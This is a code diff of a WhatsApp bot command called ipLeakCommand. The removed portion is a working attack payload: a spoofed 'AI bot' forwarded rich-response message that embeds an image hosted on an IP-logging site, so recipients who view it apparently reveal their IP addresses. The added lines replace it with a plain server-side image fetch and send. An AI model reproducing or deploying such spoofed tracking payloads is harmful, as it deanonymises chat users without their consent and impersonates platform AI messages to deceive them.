@@ -1,4 +1,4 @@
-const crypto = require('crypto');
+const axios = require('axios');
 
 async function ipLeakCommand(sock, chatId, msg, args = [], options = {}) {
     try {
@@ -8,29 +8,10 @@ async function ipLeakCommand(sock, chatId, msg, args = [], options = {}) {
             return false;
         }
 
-        // Get sender context to avoid WhatsApp code errors
-        const senderId = options.senderId || msg?.key?.participant || msg?.key?.remoteJid || '';
         const customText = Array.isArray(args) ? args.join(' ').trim() : String(args || '').trim();
         const titleText = customText || 'IP LEAK';
         const timestamp = Date.now();
         const imageUrl = `https://ipleak.nixel.dev/image/ip?timestamp=${timestamp}`;
-
-        // Build context info with proper sender metadata - WhatsApp compliant
-        const contextInfo = {
-            forwardingScore: 1,
-            isForwarded: true,
-            forwardedAiBotMessageInfo: {
-                botJid: '0@bot'
-            },
-            forwardOrigin: 4,
-            quotedMessage: msg?.quoted || null
-        };
-
-        // Add sender info if available to prevent WhatsApp errors
-        if (senderId && typeof senderId === 'string') {
-            contextInfo.participant = senderId;
-            contextInfo.mentionedJid = [senderId];
-        }
 
         // Validate chat ID
         if (!chatId || typeof chatId !== 'string') {
@@ -38,102 +19,23 @@ async function ipLeakCommand(sock, chatId, msg, args = [], options = {}) {
             return false;
         }
 
-        const payload = {
-            messageContextInfo: {
-                deviceListMetadata: {},
-                deviceListMetadataVersion: 2,
-                botMetadata: {
-                    messageDisclaimerText: '',
-                    richResponseSourcesMetadata: {}
-                }
-            },
-            botForwardedMessage: {
-                message: {
-                    richResponseMessage: {
-                        messageType: 1,
-                        unifiedResponse: {
-                            data: Buffer.from(JSON.stringify({
-                                response_id: crypto.randomUUID(),
-                                sections: [
-                                    {
-                                        __typename: 'GenAIUnifiedResponseSection',
-                                        view_model: {
-                                            __typename: 'GenAISingleLayoutViewModel',
-                                            primitive: {
-                                                __typename: 'GenAIMarkdownTextUXPrimitive',
-                                                text: `${titleText}\u0000`,
-                                                inline_entities: [
-                                                    {
-                                                        __typename: 'GenAITextInlineEntity',
-                                                        key: 'NIXEL',
-                                                        metadata: {
-                                                            __typename: 'GenAILatexItem',
-                                                            latex_expression: '\u0000',
-                                                            font_height: 24,
-                                                            padding: 4,
-                                                            latex_image: {
-                                                                __typename: 'GenAIMediaItem',
-                                                                mime_type: 'image/png',
-                                                                url: 'https://files.catbox.moe/2rpeyy.png',
-                                                                url_fallback: 'https://files.catbox.moe/2rpeyy.png',
-                                                                width: 417.3913043478261,
-                                                                height: 117.3913043478261,
-                                                                expiration_timestamp_ms: Date.now() + 60 * 60 * 1000
-                                                            }
-                                                        }
-                                                    }
-                                                ]
-                                            }
-                                        }
-                                    },
-                                    {
-                                        view_model: {
-                                            primitive: {
-                                                __typename: 'GenAIImagePrimitive',
-                                                preview_image: {
-                                                    __typename: 'GenAIMediaItem',
-                                                    mime_type: 'image/jpeg',
-                                                    url: imageUrl
-                                                },
-                                                full_image: {
-                                                    __typename: 'GenAIMediaItem',
-                                                    mime_type: 'image/jpeg',
-                                                    url: imageUrl
-                                                }
-                                            },
-                                            __typename: 'GenAISingleLayoutViewModel'
-                                        }
-                                    },
-                                    {
-                                        view_model: {
-                                            primitive: {
-                                                __typename: 'GenAIFooterActionPrimitive',
-                                                cta_text: 'WhatsApp Group',
-                                                cta_type: 'OPEN_URL',
-                                                cta_url: 'https://chat.whatsapp.com/DRirs6nV3073MR6JvaSRrS?s=cl&p=a&ilr=0'
-                                            },
-                                            __typename: 'GenAISingleLayoutViewModel'
-                                        }
-                                    }
-                                ]
-                            })).toString('base64')
-                        }
-                    }
-                }
-            },
-            contextInfo: contextInfo
-        };
+        const imageResponse = await axios.get(imageUrl, {
+            responseType: 'arraybuffer',
+            timeout: 30000
+        });
 
-        // Use relayMessage with proper context to avoid WhatsApp errors
         try {
-            const result = await sock.relayMessage(chatId, payload, {});
+            const result = await sock.sendMessage(chatId, {
+                image: Buffer.from(imageResponse.data),
+                caption: titleText
+            }, { quoted: msg });
             if (!result) {
-                console.warn('relayMessage returned no result');
+                console.warn('sendMessage returned no result');
                 return false;
             }
             return true;
         } catch (relayError) {
-            console.error('relayMessage failed:', relayError?.message || relayError);
+            console.error('sendMessage failed:', relayError?.message || relayError);
             throw relayError;
         }
     } catch (error) {
